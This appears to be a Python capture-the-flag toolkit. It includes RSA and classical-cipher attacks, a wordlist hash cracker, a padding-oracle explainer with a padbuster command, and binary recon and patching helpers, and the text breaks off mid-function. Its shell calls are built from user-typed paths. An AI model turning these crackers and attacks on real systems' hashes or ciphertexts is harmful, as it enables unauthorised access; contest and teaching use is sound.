#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          SNCO ELITE CTF TOOLKIT  —  All-in-One Competition Script           ║
║                         Road to Rank 1  |  v1.0                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
    python3 ctf_toolkit.py                    # Interactive menu
    python3 ctf_toolkit.py --auto <file>      # Auto-detect & decode file
    python3 ctf_toolkit.py --magic <string>   # Magic decode a string

INSTALL DEPS:
    pip install pycryptodome gmpy2 requests pwntools owiener pyperclip 2>/dev/null
"""

import os, sys, re, base64, codecs, binascii, string, hashlib, itertools
import struct, socket, json, time, math, subprocess, argparse, textwrap
from collections import Counter
from urllib.parse import quote, unquote, urlencode
from pathlib import Path

# ── Optional imports (graceful fallback) ──────────────────────────────────────
try:
    from Crypto.Cipher import AES, DES
    from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrime
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import gmpy2
    HAS_GMPY2 = True
except ImportError:
    HAS_GMPY2 = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import owiener
    HAS_OWIENER = True
except ImportError:
    HAS_OWIENER = False

try:
    import pyperclip
    HAS_CLIP = True
except ImportError:
    HAS_CLIP = False

# ══════════════════════════════════════════════════════════════════════════════
#  COLOURS & UI
# ══════════════════════════════════════════════════════════════════════════════

class C:
    RED    = '\033[91m';  GREEN  = '\033[92m';  YELLOW = '\033[93m'
    BLUE   = '\033[94m';  PURPLE = '\033[95m';  CYAN   = '\033[96m'
    WHITE  = '\033[97m';  BOLD   = '\033[1m';   DIM    = '\033[2m'
    RESET  = '\033[0m'

def banner():
    print(f"""{C.CYAN}{C.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║   ███████╗███╗   ██╗ ██████╗ ██████╗     ████████╗██╗  ██╗                 ║
║   ██╔════╝████╗  ██║██╔════╝██╔═══██╗       ██╔══╝██║ ██╔╝                 ║
║   ███████╗██╔██╗ ██║██║     ██║   ██║       ██║   █████╔╝                  ║
║   ╚════██║██║╚██╗██║██║     ██║   ██║       ██║   ██╔═██╗                  ║
║   ███████║██║ ╚████║╚██████╗╚██████╔╝       ██║   ██║  ██╗                 ║
║   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝        ╚═╝   ╚═╝  ╚═╝                ║
║                   ELITE CTF TOOLKIT  —  Road to Rank 1                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
{C.RESET}""")

def section(title):
    print(f"\n{C.BOLD}{C.PURPLE}{'═'*60}{C.RESET}")
    print(f"{C.BOLD}{C.YELLOW}  {title}{C.RESET}")
    print(f"{C.BOLD}{C.PURPLE}{'═'*60}{C.RESET}\n")

def ok(msg):    print(f"  {C.GREEN}[+]{C.RESET} {msg}")
def info(msg):  print(f"  {C.BLUE}[*]{C.RESET} {msg}")
def warn(msg):  print(f"  {C.YELLOW}[!]{C.RESET} {msg}")
def err(msg):   print(f"  {C.RED}[-]{C.RESET} {msg}")
def flag(msg):  print(f"\n  {C.BOLD}{C.GREEN}🚩 FLAG CANDIDATE: {msg}{C.RESET}\n")

def clip(text):
    if HAS_CLIP:
        try: pyperclip.copy(str(text)); print(f"  {C.DIM}(copied to clipboard){C.RESET}")
        except: pass

def menu(title, options):
    section(title)
    for i, opt in enumerate(options, 1):
        print(f"  {C.CYAN}[{i:2}]{C.RESET}  {opt}")
    print(f"  {C.CYAN}[ 0]{C.RESET}  ← Back / Exit")
    try:
        choice = int(input(f"\n{C.BOLD}  Select > {C.RESET}"))
        return choice
    except (ValueError, KeyboardInterrupt):
        return 0

def get_input(prompt, default=None):
    try:
        val = input(f"  {C.CYAN}{prompt}{C.RESET} ").strip()
        return val if val else default
    except KeyboardInterrupt:
        return default

# ══════════════════════════════════════════════════════════════════════════════
#  1. ENCODING / DECODING
# ══════════════════════════════════════════════════════════════════════════════

def detect_encoding(s):
    """Heuristic encoding detector."""
    s = s.strip()
    results = []
    # Base64
    b64_chars = set(string.ascii_letters + string.digits + '+/=')
    if all(c in b64_chars for c in s) and len(s) % 4 == 0:
        results.append('base64')
    # Base32
    b32_chars = set(string.ascii_uppercase + '234567=')
    if all(c in b32_chars for c in s.upper()) and len(s) % 8 == 0:
        results.append('base32')
    # Hex
    if all(c in string.hexdigits for c in s.replace(' ','').replace('0x','')):
        results.append('hex')
    # Binary
    if all(c in '01 ' for c in s) and len(s.replace(' ','')) % 8 == 0:
        results.append('binary')
    # URL encoded
    if '%' in s:
        results.append('url_encoded')
    # Decimal (space-separated)
    if all(p.isdigit() for p in s.split()) and len(s.split()) > 1:
        results.append('decimal_ascii')
    # Morse
    if all(c in '.-/ ' for c in s):
        results.append('morse')
    # Only printable ASCII with rot-like shift
    results.append('rot13/caesar')
    return results

def magic_decode(s):
    """Try every encoding automatically and print results."""
    section("MAGIC DECODER")
    info(f"Input: {repr(s[:80])}")
    print()

    attempts = {}

    # Base64
    try:
        pad = s + '=' * (-len(s) % 4)
        d = base64.b64decode(pad).decode('utf-8', errors='replace')
        if any(32 <= ord(c) <= 126 for c in d):
            attempts['Base64'] = d
    except: pass

    # Base32
    try:
        pad = s.upper() + '=' * (-len(s) % 8)
        d = base64.b32decode(pad).decode('utf-8', errors='replace')
        if any(32 <= ord(c) <= 126 for c in d):
            attempts['Base32'] = d
    except: pass

    # Base85
    try:
        d = base64.b85decode(s).decode('utf-8', errors='replace')
        if any(32 <= ord(c) <= 126 for c in d):
            attempts['Base85'] = d
    except: pass

    # Hex
    try:
        clean = s.replace(' ','').replace('0x','').replace('\\x','')
        if len(clean) % 2 == 0:
            d = bytes.fromhex(clean).decode('utf-8', errors='replace')
            if any(32 <= ord(c) <= 126 for c in d):
                attempts['Hex'] = d
    except: pass

    # Binary
    try:
        bits = s.replace(' ','')
        if len(bits) % 8 == 0 and all(c in '01' for c in bits):
            chars = [chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8)]
            d = ''.join(chars)
            if any(32 <= ord(c) <= 126 for c in d):
                attempts['Binary'] = d
    except: pass

    # URL decode
    try:
        d = unquote(s)
        if d != s:
            attempts['URL Decode'] = d
    except: pass

    # Rot13
    attempts['ROT13'] = codecs.decode(s, 'rot_13')

    # Caesar brute
    best_caesar = None
    best_score = 0
    for n in range(1, 26):
        shifted = ''.join(
            chr((ord(c)-65+n)%26+65) if c.isupper() else
            chr((ord(c)-97+n)%26+97) if c.islower() else c
            for c in s
        )
        score = sum(1 for w in ['the','flag','ctf','and','is','to','you','key'] if w in shifted.lower())
        if score > best_score:
            best_score, best_caesar = score, (n, shifted)
    if best_caesar and best_score > 0:
        attempts[f'Caesar +{best_caesar[0]}'] = best_caesar[1]

    # Decimal ASCII
    try:
        nums = [int(x) for x in s.split()]
        if all(32 <= n <= 126 for n in nums):
            attempts['Decimal ASCII'] = ''.join(chr(n) for n in nums)
    except: pass

    # Morse code
    MORSE = {'.-':'A','-.':'B','-.-.':'C','-..':'D','.':'E','..-.':'F',
             '--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L',
             '--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R',
             '...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X',
             '-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2',
             '...--':'3','....-':'4','.....':'5','-....':'6','--...':'7',
             '---..':'8','----.':'9'}
    try:
        words = s.strip().split(' / ')
        decoded = ' '.join(''.join(MORSE.get(c,'?') for c in w.split()) for w in words)
        if '?' not in decoded and decoded.strip():
            attempts['Morse'] = decoded
    except: pass

    # HTML entities
    try:
        import html
        d = html.unescape(s)
        if d != s:
            attempts['HTML Unescape'] = d
    except: pass

    # Print results
    found_flag = False
    for method, result in attempts.items():
        clean = result.strip()
        is_flag = bool(re.search(r'[A-Z_]{2,10}\{[^}]+\}', clean, re.IGNORECASE))
        color = C.GREEN if is_flag else C.WHITE
        print(f"  {C.CYAN}[{method:15}]{C.RESET}  {color}{clean[:100]}{C.RESET}")
        if is_flag:
            flag(clean)
            clip(clean)
            found_flag = True

    if not found_flag:
        info("No flag found. Check results above for partial decodes.")
    return attempts

# ══════════════════════════════════════════════════════════════════════════════
#  2. CRYPTOGRAPHY ATTACKS
# ══════════════════════════════════════════════════════════════════════════════

def crypto_menu():
    while True:
        c = menu("CRYPTOGRAPHY ATTACKS", [
            "RSA — Small Exponent (cube/eth root)",
            "RSA — Common Modulus Attack",
            "RSA — Wiener's Attack (small d)",
            "RSA — Factor n (known p-q relation / Fermat)",
            "RSA — Manual decrypt (given n, e, d or p, q)",
            "Vigenere — Crack with Index of Coincidence",
            "XOR — Key recovery (known plaintext / brute)",
            "Hash — Identify hash type",
            "Hash — MD5/SHA1 brute force (wordlist)",
            "AES-ECB — Block analysis / byte-at-a-time",
            "Padding Oracle — Demo framework",
        ])
        if c == 0: break
        elif c == 1:  rsa_small_e()
        elif c == 2:  rsa_common_modulus()
        elif c == 3:  rsa_wiener()
        elif c == 4:  rsa_fermat_factor()
        elif c == 5:  rsa_manual_decrypt()
        elif c == 6:  vigenere_crack()
        elif c == 7:  xor_crack()
        elif c == 8:  hash_identify()
        elif c == 9:  hash_brute()
        elif c == 10: aes_ecb_analysis()
        elif c == 11: padding_oracle_demo()

def rsa_small_e():
    section("RSA — SMALL EXPONENT ATTACK")
    if not HAS_GMPY2: warn("gmpy2 not installed — using Python fallback (slow for large n)"); 
    try:
        c = int(get_input("Ciphertext c (integer):"))
        e = int(get_input("Exponent e:", "3"))
        info(f"Attempting e={e} root of c...")
        if HAS_GMPY2:
            m, exact = gmpy2.iroot(c, e)
            if exact:
                result = long_to_bytes(int(m)) if HAS_CRYPTO else m.to_bytes((int(m).bit_length()+7)//8,'big')
                ok(f"Exact root found!  m = {int(m)}")
                ok(f"Decoded: {result}")
                flag(result.decode('utf-8','replace'))
                clip(result.decode('utf-8','replace'))
            else:
                warn("No exact root. Message may have padding, or wrong e.")
                info("Trying small multiples of n (CRT extension)...")
                n = get_input("Enter n (or press Enter to skip):")
                if n:
                    n = int(n)
                    for k in range(1, 1000):
                        m, exact = gmpy2.iroot(k*n**1 + c if e==1 else c + k*n**e, e)
                        # standard broadcast: c + k*n
                        m2, exact2 = gmpy2.iroot(c + k*n, e)
                        if exact2:
                            result = m2.to_bytes((int(m2).bit_length()+7)//8,'big')
                            ok(f"Found with k={k}: {result}")
                            flag(result.decode('utf-8','replace'))
                            return
                    warn("Broadcast attack failed for k<1000.")
        else:
            # Pure Python integer nth root
            m = round(c ** (1/e))
            for candidate in [m-1, m, m+1]:
                if candidate**e == c:
                    result = candidate.to_bytes((candidate.bit_length()+7)//8,'big')
                    ok(f"m = {candidate}")
                    flag(result.decode('utf-8','replace'))
                    return
            warn("No exact root found.")
    except Exception as ex:
        err(f"Error: {ex}")

def rsa_common_modulus():
    section("RSA — COMMON MODULUS ATTACK")
    info("Requires: same plaintext encrypted with same n but different (e1, e2) where gcd(e1,e2)=1")
    try:
        n  = int(get_input("Modulus n:"))
        e1 = int(get_input("Exponent e1:"))
        e2 = int(get_input("Exponent e2:"))
        c1 = int(get_input("Ciphertext c1:"))
        c2 = int(get_input("Ciphertext c2:"))

        def extended_gcd(a, b):
            if b == 0: return a, 1, 0
            g, x, y = extended_gcd(b, a % b)
            return g, y, x - (a // b) * y

        g, s1, s2 = extended_gcd(e1, e2)
        if g != 1:
            warn(f"gcd(e1,e2) = {g} ≠ 1. Attack may fail.")

        def modinv(a, m):
            _, x, _ = extended_gcd(a % m, m)
            return x % m

        if s1 < 0:
            c1 = modinv(c1, n)
            s1 = -s1
        if s2 < 0:
            c2 = modinv(c2, n)
            s2 = -s2

        m = (pow(c1, s1, n) * pow(c2, s2, n)) % n
        result = m.to_bytes((m.bit_length()+7)//8, 'big')
        ok(f"Recovered m = {m}")
        ok(f"Decoded: {result}")
        flag(result.decode('utf-8','replace'))
        clip(result.decode('utf-8','replace'))
    except Exception as ex:
        err(f"Error: {ex}")

def rsa_wiener():
    section("RSA — WIENER'S ATTACK (SMALL d)")
    if not HAS_OWIENER:
        warn("owiener not installed. Run: pip install owiener")
        info("Manual continued-fraction implementation follows...")
    try:
        e = int(get_input("Public exponent e:"))
        n = int(get_input("Modulus n:"))

        if HAS_OWIENER:
            d = owiener.attack(e, n)
            if d:
                ok(f"Private key d = {d}")
                c = get_input("Ciphertext c to decrypt (or Enter to skip):")
                if c:
                    m = pow(int(c), d, n)
                    result = m.to_bytes((m.bit_length()+7)//8,'big')
                    flag(result.decode('utf-8','replace'))
            else:
                warn("Wiener's attack failed — d is likely not small.")
        else:
            # Minimal continued fractions implementation
            def cf_expansion(num, den):
                while den:
                    yield num // den
                    num, den = den, num % den

            def cf_convergents(cf):
                n0, d0, n1, d1 = 0, 1, 1, 0
                for a in cf:
                    n0, n1 = n1, a*n1 + n0
                    d0, d1 = d1, a*d1 + d0
                    yield n1, d1

            for k, d in cf_convergents(cf_expansion(e, n)):
                if k == 0: continue
                phi, rem = divmod(e*d - 1, k)
                if rem != 0: continue
                # Check if phi yields valid p,q
                b = n - phi + 1
                disc = b*b - 4*n
                if disc < 0: continue
                sq = int(math.isqrt(disc))
                if sq*sq == disc and (b+sq) % 2 == 0:
                    ok(f"Found d = {d}")
                    c = get_input("Ciphertext c (or Enter to skip):")
                    if c:
                        m = pow(int(c), d, n)
                        result = m.to_bytes((m.bit_length()+7)//8,'big')
                        flag(result.decode('utf-8','replace'))
                    return
            warn("Wiener's attack failed.")
    except Exception as ex:
        err(f"Error: {ex}")

def rsa_fermat_factor():
    section("RSA — FERMAT FACTORISATION (p ≈ q)")
    info("Works when p and q are close together.")
    try:
        n = int(get_input("Modulus n:"))
        info("Running Fermat's factorisation...")
        a = math.isqrt(n)
        if a * a == n:
            ok(f"n is a perfect square! p = q = {a}")
            return
        a += 1
        b2 = a*a - n
        max_iter = 1_000_000
        for _ in range(max_iter):
            b = math.isqrt(b2)
            if b*b == b2:
                p, q = a - b, a + b
                ok(f"Factored! p = {p}")
                ok(f"         q = {q}")
                e = int(get_input("Exponent e (for decryption):", "65537"))
                phi = (p-1)*(q-1)

                def modinv(a, m):
                    g, x, _ = _egcd(a, m)
                    return x % m if g == 1 else None

                def _egcd(a, b):
                    if b == 0: return a, 1, 0
                    g, x, y = _egcd(b, a%b)
                    return g, y, x - (a//b)*y

                d = modinv(e, phi)
                ok(f"Private key d = {d}")
                c = get_input("Ciphertext c (or Enter to skip):")
                if c:
                    m = pow(int(c), d, n)
                    result = m.to_bytes((m.bit_length()+7)//8,'big')
                    flag(result.decode('utf-8','replace'))
                return
            a += 1
            b2 = a*a - n
        warn(f"Fermat failed after {max_iter} iterations. p and q are far apart.")
    except Exception as ex:
        err(f"Error: {ex}")

def rsa_manual_decrypt():
    section("RSA — MANUAL DECRYPT")
    info("Provide (n,e,d) or (p,q,e) to decrypt a ciphertext.")
    try:
        mode = get_input("Mode: (1) n,d given  (2) p,q,e given:", "1")

        def _egcd(a, b):
            if b == 0: return a, 1, 0
            g, x, y = _egcd(b, a%b)
            return g, y, x-(a//b)*y

        def modinv(a, m):
            g, x, _ = _egcd(a%m, m)
            return x%m if g==1 else None

        if mode == "2":
            p = int(get_input("p:"))
            q = int(get_input("q:"))
            e = int(get_input("e:", "65537"))
            n = p * q
            phi = (p-1)*(q-1)
            d = modinv(e, phi)
            ok(f"n = {n}")
            ok(f"d = {d}")
        else:
            n = int(get_input("n:"))
            d = int(get_input("d:"))

        c = int(get_input("Ciphertext c:"))
        m = pow(c, d, n)
        result = m.to_bytes((m.bit_length()+7)//8,'big')
        ok(f"m (int) = {m}")
        ok(f"m (bytes) = {result}")
        flag(result.decode('utf-8','replace'))
        clip(result.decode('utf-8','replace'))
    except Exception as ex:
        err(f"Error: {ex}")

def vigenere_crack():
    section("VIGENERE CRACKER — Index of Coincidence")
    ct = get_input("Ciphertext (letters only, case insensitive):").upper()
    ct = ''.join(c for c in ct if c.isalpha())
    if not ct:
        err("No input.")
        return

    def ioc(text):
        n = len(text)
        if n < 2: return 0
        freq = Counter(text)
        return sum(f*(f-1) for f in freq.values()) / (n*(n-1))

    def score_text(text):
        """English letter frequency score (higher = more English-like)."""
        eng = {c: f for c, f in zip('ABCDEFGHIJKLMNOPQRSTUVWXYZ',
               [8.2,1.5,2.8,4.3,12.7,2.2,2.0,6.1,7.0,0.15,0.77,4.0,2.4,
                6.7,7.5,1.9,0.10,6.0,6.3,9.1,2.8,0.98,2.4,0.15,2.0,0.074])}
        freq = Counter(text)
        total = len(text)
        return sum(eng.get(c,0) * freq.get(c,0)/total for c in eng)

    info(f"Ciphertext length: {len(ct)}")

    # Estimate key length via IoC
    best_kl, best_ioc = 1, 0
    print(f"\n  {'KeyLen':>6}  {'IoC':>8}  {'Verdict':>12}")
    for kl in range(1, min(21, len(ct)//4)):
        avg_ioc = sum(ioc(ct[i::kl]) for i in range(kl)) / kl
        likely = "★ LIKELY" if avg_ioc > 0.060 else ""
        print(f"  {kl:6}   {avg_ioc:.6f}  {likely}")
        if avg_ioc > best_ioc:
            best_ioc, best_kl = avg_ioc, kl

    ok(f"\nBest estimated key length: {best_kl}  (IoC={best_ioc:.6f})")
    kl = int(get_input(f"Use key length:", str(best_kl)))

    # Frequency analysis per column
    key = ''
    for i in range(kl):
        col = ct[i::kl]
        freq = Counter(col)
        # Assume most frequent letter decrypts to 'E'
        most_common = freq.most_common(1)[0][0]
        shift = (ord(most_common) - ord('E')) % 26
        key += chr(65 + shift)

    ok(f"Recovered key: {C.GREEN}{key}{C.RESET}")

    # Decrypt
    plaintext = ''
    ki = 0
    for c in ct:
        if c.isalpha():
            shift = ord(key[ki % kl]) - 65
            plaintext += chr((ord(c) - 65 - shift) % 26 + 65)
            ki += 1
        else:
            plaintext += c

    ok(f"Plaintext: {plaintext[:200]}")
    score = score_text(plaintext)
    info(f"English score: {score:.2f} (>4 = likely correct)")
    flag_match = re.search(r'[A-Z_]{2,10}\{[^}]+\}', plaintext)
    if flag_match:
        flag(flag_match.group())
        clip(flag_match.group())

def xor_crack():
    section("XOR KEY RECOVERY")
    info("Options: 1=known-plaintext  2=single-byte brute  3=repeating-key brute")
    mode = get_input("Mode (1/2/3):", "2")

    ct_hex = get_input("Ciphertext (hex):")
    try:
        ct = bytes.fromhex(ct_hex.replace(' ','').replace('0x',''))
    except:
        ct = ct_hex.encode()

    if mode == "1":
        pt_known = get_input("Known plaintext (ASCII):").encode()
        key = bytes(a^b for a,b in zip(ct, pt_known))
        ok(f"Recovered key (hex): {key.hex()}")
        ok(f"Recovered key (ASCII): {key.decode('utf-8','replace')}")

    elif mode == "2":
        info("Brute-forcing single byte key...")
        results = []
        for k in range(256):
            pt = bytes(b ^ k for b in ct)
            score = sum(c in b' etaoinshrdlu' for c in pt.lower())
            results.append((score, k, pt))
        results.sort(reverse=True)
        print(f"\n  {'Key':>5}  {'Score':>6}  Plaintext")
        for score, k, pt in results[:10]:
            preview = pt.decode('utf-8','replace')[:60]
            flag_match = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', preview)
            marker = f"  {C.GREEN}← FLAG?{C.RESET}" if flag_match else ""
            print(f"  0x{k:02x}   {score:6}  {preview}{marker}")
            if flag_match:
                flag(flag_match.group())
                clip(flag_match.group())

    elif mode == "3":
        max_kl = int(get_input("Max key length to try:", "16"))
        info(f"Brute-forcing repeating XOR key up to length {max_kl}...")
        for kl in range(1, max_kl+1):
            key = b''
            for i in range(kl):
                col = bytes(ct[j] for j in range(i, len(ct), kl))
                best = max(range(256), key=lambda k: sum(c in b' etaoinshrdlu' for c in bytes(b^k for b in col)))
                key += bytes([best])
            pt = bytes(ct[i] ^ key[i % kl] for i in range(len(ct)))
            preview = pt.decode('utf-8','replace')
            flag_match = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', preview)
            if flag_match:
                ok(f"Key length {kl}: key={key.hex()} key_ascii={key.decode('utf-8','replace')}")
                ok(f"Plaintext: {preview[:100]}")
                flag(flag_match.group())
                clip(flag_match.group())
                return
        # print top-scoring
        ok("Top results (no flag found):")
        key = b''
        for i in range(1):
            col = bytes(ct[j] for j in range(i, len(ct), 1))
            best = max(range(256), key=lambda k: sum(c in b' etaoinshrdlu' for c in bytes(b^k for b in col)))
            key += bytes([best])
        pt = bytes(b ^ key[0] for b in ct)
        ok(f"Single-byte key 0x{key[0]:02x}: {pt.decode('utf-8','replace')[:80]}")

def hash_identify():
    section("HASH IDENTIFIER")
    h = get_input("Hash string:").strip()
    patterns = [
        (32,  'MD5 / NTLM / LM'),
        (40,  'SHA-1 / MySQL5 / Cisco-IOS'),
        (56,  'SHA-224 / Haval-224'),
        (64,  'SHA-256 / BLAKE2-256 / Keccak-256'),
        (96,  'SHA-384'),
        (128, 'SHA-512 / Whirlpool / BLAKE2-512'),
    ]
    if all(c in string.hexdigits for c in h):
        for length, name in patterns:
            if len(h) == length:
                ok(f"Likely hash type: {C.GREEN}{name}{C.RESET}  (length={length})")
                return
        warn(f"Hex string of length {len(h)} — no common match")
    elif h.startswith('$2'):
        ok("bcrypt hash (length-agnostic)")
    elif h.startswith('$6$'):
        ok("SHA-512 crypt (Unix shadow)")
    elif h.startswith('$1$'):
        ok("MD5 crypt")
    else:
        warn("Not a pure hex hash — may be encoded or non-standard")
    info(f"Hash length: {len(h)}")

def hash_brute():
    section("HASH BRUTE FORCE (WORDLIST)")
    target = get_input("Target hash:").strip().lower()
    wordlist_path = get_input("Wordlist path:", "/usr/share/wordlists/rockyou.txt")
    algo = get_input("Algorithm (md5/sha1/sha256/sha512):", "md5").lower()

    hash_funcs = {
        'md5': lambda w: hashlib.md5(w).hexdigest(),
        'sha1': lambda w: hashlib.sha1(w).hexdigest(),
        'sha256': lambda w: hashlib.sha256(w).hexdigest(),
        'sha512': lambda w: hashlib.sha512(w).hexdigest(),
    }

    if algo not in hash_funcs:
        err("Unsupported algorithm"); return
    fn = hash_funcs[algo]

    if not os.path.exists(wordlist_path):
        err(f"Wordlist not found: {wordlist_path}")
        wordlist_path = get_input("Try another path:")
        if not os.path.exists(wordlist_path): return

    info(f"Cracking {algo.upper()} hash: {target}")
    start = time.time()
    count = 0
    try:
        with open(wordlist_path, 'rb') as f:
            for line in f:
                word = line.strip()
                count += 1
                if fn(word) == target:
                    elapsed = time.time() - start
                    ok(f"CRACKED after {count} attempts ({elapsed:.2f}s)")
                    flag(word.decode('utf-8','replace'))
                    clip(word.decode('utf-8','replace'))
                    return
                if count % 100000 == 0:
                    print(f"\r  {C.DIM}Tried {count:,} words...{C.RESET}", end='', flush=True)
    except KeyboardInterrupt:
        print()
        warn(f"Interrupted after {count:,} attempts")
    warn("Hash not found in wordlist.")

def aes_ecb_analysis():
    section("AES-ECB BLOCK ANALYSIS")
    info("ECB mode encrypts identical 16-byte blocks identically — detect repetition.")
    ct_hex = get_input("Ciphertext hex (or path to binary file):")

    if os.path.exists(ct_hex):
        with open(ct_hex, 'rb') as f:
            ct = f.read()
    else:
        try:
            ct = bytes.fromhex(ct_hex.replace(' ',''))
        except:
            ct = ct_hex.encode()

    block_size = 16
    blocks = [ct[i:i+block_size] for i in range(0, len(ct), block_size)]
    block_counts = Counter(blocks)
    duplicates = {b: c for b, c in block_counts.items() if c > 1}

    info(f"Total blocks: {len(blocks)}")
    if duplicates:
        ok(f"ECB detected! {len(duplicates)} repeated block(s):")
        for b, c in sorted(duplicates.items(), key=lambda x: -x[1]):
            ok(f"  Block {b.hex()} appears {c}× — positions: {[i for i,bl in enumerate(blocks) if bl==b]}")
    else:
        info("No repeated blocks found (not ECB, or no repeated plaintext blocks).")

    if HAS_CRYPTO:
        key = get_input("AES key (hex, or Enter to skip decryption):")
        if key:
            try:
                k = bytes.fromhex(key.replace(' ',''))
                cipher = AES.new(k, AES.MODE_ECB)
                pt = cipher.decrypt(ct)
                ok(f"Decrypted: {pt}")
                try:
                    pt = unpad(pt, 16)
                except: pass
                flag(pt.decode('utf-8','replace'))
            except Exception as ex:
                err(f"Decryption failed: {ex}")

def padding_oracle_demo():
    section("PADDING ORACLE — FRAMEWORK DEMO")
    info("This is a local demo of the padding oracle byte-flipping logic.")
    info("For real attacks, point TARGET_URL at the vulnerable endpoint.")
    print(f"""
  {C.CYAN}Padding Oracle Concept:{C.RESET}
  ┌──────────────────────────────────────────────────────┐
  │  CBC decryption: P[i] = D(C[i]) XOR C[i-1]          │
  │  Flip C[i-1] to control P[i]                         │
  │  Oracle tells you when padding is valid (0x01 ... )  │
  │                                                      │
  │  For byte at position j (from end):                  │
  │  1. Brute 0x00-0xff for C'[j]                        │
  │  2. When oracle says VALID: D(C[j]) = 0x01 XOR C'[j] │
  │  3. P[j] = D(C[j]) XOR original C[j]                 │
  └──────────────────────────────────────────────────────┘

  {C.YELLOW}Quick-start with padbuster:{C.RESET}
  padbuster http://TARGET/decrypt CIPHERTEXT_HEX 16 -encoding 0

  {C.YELLOW}Python library:{C.RESET}
  pip install cryptography
  # Use PaddingOracle class from python-paddingoracle
    """)

# ══════════════════════════════════════════════════════════════════════════════
#  3. REVERSE ENGINEERING TOOLS
# ══════════════════════════════════════════════════════════════════════════════

def re_menu():
    while True:
        c = menu("REVERSE ENGINEERING", [
            "Static analysis — run all recon on a binary",
            "String extractor — find flags & interesting strings",
            "Disassemble function (objdump wrapper)",
            "Patch binary — flip bytes / NOP a jump",
            "Anti-debug checker (ptrace patterns)",
            "ELF header parser",
            "RE workflow checklist (interactive)",
        ])
        if c == 0: break
        elif c == 1: binary_recon()
        elif c == 2: string_extractor()
        elif c == 3: disassemble_fn()
        elif c == 4: patch_binary()
        elif c == 5: antidebug_check()
        elif c == 6: elf_header()
        elif c == 7: re_checklist()

def _run(cmd):
    """Run shell command, return stdout."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return r.stdout + r.stderr
    except Exception as ex:
        return f"Error: {ex}"

def binary_recon():
    section("BINARY RECON — FULL STATIC SWEEP")
    path = get_input("Binary path:")
    if not os.path.exists(path):
        err(f"File not found: {path}"); return

    checks = [
        ("File type",       f"file '{path}'"),
        ("Size",            f"wc -c '{path}'"),
        ("Shared libs",     f"ldd '{path}' 2>/dev/null || echo '(not ELF or static)'"),
        ("Security flags",  f"checksec --file='{path}' 2>/dev/null || python3 -c \""
                             "import struct,sys; d=open(sys.argv[1],'rb').read(); "
                             "print('NX:',d[0x47]==1 if len(d)>0x47 else '?')\" '{path}' 2>/dev/null"),
        ("Symbols (nm)",    f"nm -D '{path}' 2>/dev/null | head -30"),
        ("Interesting strs",f"strings -a '{path}' | grep -Ei 'flag|ctf|key|pass|secret|win|admin|input|correct|wrong' | head -20"),
        ("Imports",         f"objdump -d '{path}' 2>/dev/null | grep '<.*@plt>' | sort -u | head -20"),
        ("Sections",        f"readelf -S '{path}' 2>/dev/null | head -30"),
    ]

    for name, cmd in checks:
        result = _run(cmd).strip()
        if result:
            print(f"\n  {C.BOLD}{C.CYAN}── {name} ──{C.RESET}")
            for line in result.split('\n')[:8]:
                flag_hit = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
                color = C.GREEN if flag_hit else C.WHITE
                print(f"    {color}{line}{C.RESET}")
                if flag_hit:
                    flag(flag_hit.group())

def string_extractor():
    section("STRING EXTRACTOR")
    path = get_input("Binary path:")
    min_len = int(get_input("Min string length:", "4"))
    pattern = get_input("Filter pattern (regex, or Enter for all):", "")

    result = _run(f"strings -a -n {min_len} '{path}'")
    lines = result.split('\n')

    if pattern:
        try:
            lines = [l for l in lines if re.search(pattern, l, re.IGNORECASE)]
        except:
            pass

    # Highlight flags
    for line in lines:
        flag_hit = re.search(r'[A-Za-z_]{2,10}\{[^}]+\}', line)
        if flag_hit:
            print(f"  {C.GREEN}{C.BOLD}{line}{C.RESET}")
            flag(flag_hit.group())
        else:
            print(f"  {line}")

def disassemble_fn():
    section("DISASSEMBLE FUNCTION")
    path = get_input("Binary path:")
    fn = get_input("Function name (e.g. main, check_flag):", "main")
    out = _run(f"objdump -d -M intel '{path}' 2>/dev/null | awk '/<{fn}>:/,/^$/' | head -60")
    if out.strip():
        print(f"\n{C.CYAN}{out}{C.RESET}")
    else:
        warn(f"Function '{fn}' not found or objdump failed.")
        info("Try: objdump -d -M intel binary | grep -A50 '<main>'")

def patch_binary():
    section("BINARY PATCHER")
    info("NOP out a jump instruction or change a byte value.")
    path = get_input("Binary path:")
    offset_str = get_input("Offset (hex, e.g. 0x1234):")
    new_bytes_str = get_input("New bytes (hex, e.g. 9090 for NOP NOP):")

    try:
        offset = int(offset_str, 16)
        new_bytes = bytes.fromhex(new_bytes_str.replace(' ',''))
        out_path = path + ".patched"

        with open(path, 'rb') as f:
            data = bytearray(f.read())

        old = data[offset:offset+len(new_bytes)]
        info(f"Old bytes @ 0x{offset:x}: {old.hex()}")
        data[offset:offset+len(new_bytes)] = new_bytes

        with open(out_path, 'wb') as f:
            f.write(data)
        os.chmod(out_path, 0o755)
        ok(f"Patched binary saved to: {out_path}")
        ok(f"New bytes @ 0x{offset:x}: {new_bytes.hex()}")
    except Exception as ex:
        err(f"Patch failed: {ex}")

def antidebug_check():
    section("ANTI-DEBUG CHECKER")
    path = get_input("Binary path:")
    info("Scanning for anti-debug patterns...")

    patterns = {
        "ptrace call":        r"ptrace",
        "IsDebuggerPresent":  r"IsDebuggerPresent",
        "PTRACE_TRACEME":     r"PTRACE_TRACEME",
        "getenv DEBUG":       r"getenv.*DEBUG",
        "timing check":       r"gettimeofday|clock_gettime|RDTSC",
        "proc/self/status":   r"/proc/self/status",
        "parent PID check":   r"getppid",
    }

    found = False
    strs = _run(f"strings -a '{path}'")
